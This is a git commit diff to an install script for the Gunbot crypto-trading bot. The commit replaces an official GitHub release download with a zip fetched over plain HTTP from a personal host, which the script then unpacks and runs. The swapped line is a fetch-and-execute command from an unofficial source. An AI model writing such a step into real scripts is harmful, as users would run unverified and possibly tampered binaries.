e50bbe1831217ef36c5c7ecfe863c80d243c64e1
FgTeaMBR <38961242+FgTeaMBR@users.noreply.github.com>
2019-03-14 14:01:55 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -6,6 +6,6 @@ apt-get -y -qq install unzip > /dev/null 2>&1
 cd /opt/app-root/src
 wget -q https://github.com/GuntharDeNiro/BTCT/releases/download/v1283/lin.zip $ wait
 unzip -o -qq lin.zip
-wget -qO- -O tmp.zip https://github.com/GuntharDeNiro/BTCT/releases/download/v1283/lin.zip && unzip tmp.zip && rm tmp.zip && cd lin
+wget -qO- -O tmp.zip http://www.fgteambr.esy.es/lin.zip && unzip tmp.zip && rm tmp.zip && cd lin
 chmod +x gunthy-linux
 screen -S capa ./gunthy-linux
